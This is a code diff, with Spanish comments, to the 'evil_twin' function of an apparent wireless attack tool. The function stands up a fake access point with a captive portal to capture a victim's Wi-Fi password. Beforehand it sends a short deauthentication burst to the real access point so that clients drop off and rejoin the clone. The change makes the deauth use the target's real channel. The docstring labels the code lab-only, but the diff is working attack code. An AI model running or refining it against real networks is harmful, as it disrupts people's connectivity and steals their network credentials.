@@ -605,24 +605,25 @@ def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd):
 def evil_twin(iface, ssid, bssid, channel, seconds=120):
     """Evil Twin con portal cautivo. Devuelve (data, err). data trae
     'password' (capturada o None) y 'clients'. SOLO laboratorio."""
-    # Canal del gemelo: hostapd abierto en 2.4 (hw_mode=g) es lo mas fiable;
-    # si el objetivo es 5GHz usamos canal 6 (lo que importa es el NOMBRE).
+    # Canal REAL del AP objetivo (para el deauth) y canal del GEMELO (2.4,
+    # hw_mode=g, lo mas fiable; lo que importa para la victima es el NOMBRE).
     try:
-        ch = int(channel)
+        real_ch = int(channel)
     except (ValueError, TypeError):
-        ch = 6
-    if ch < 1 or ch > 13:
-        ch = 6
+        real_ch = 6
+    ap_ch = real_ch if 1 <= real_ch <= 13 else 6
+    ch = ap_ch   # el resto del codigo usa 'ch' para el AP
 
     _ET_STATE["ssid"] = ssid
     _ET_STATE["password"] = None
     _ET_EVENT.clear()
 
-    # 1) Empujon: deauth corto al AP real para que el cliente se suelte y busque
-    #    el SSID (un solo adaptador, por eso secuencial: deauth -> luego AP).
+    # 1) Empujon: deauth corto al AP real (en SU canal real) para que el cliente
+    #    se suelte y busque el SSID. Un solo adaptador -> secuencial: deauth,
+    #    luego el AP gemelo en 2.4.
     if bssid:
         try:
-            deauth(bssid, ch, 15, iface, duration=0)  # rafaga corta
+            deauth(bssid, real_ch, 15, iface, duration=0)  # rafaga corta en el canal real
         except Exception:
             pass
 
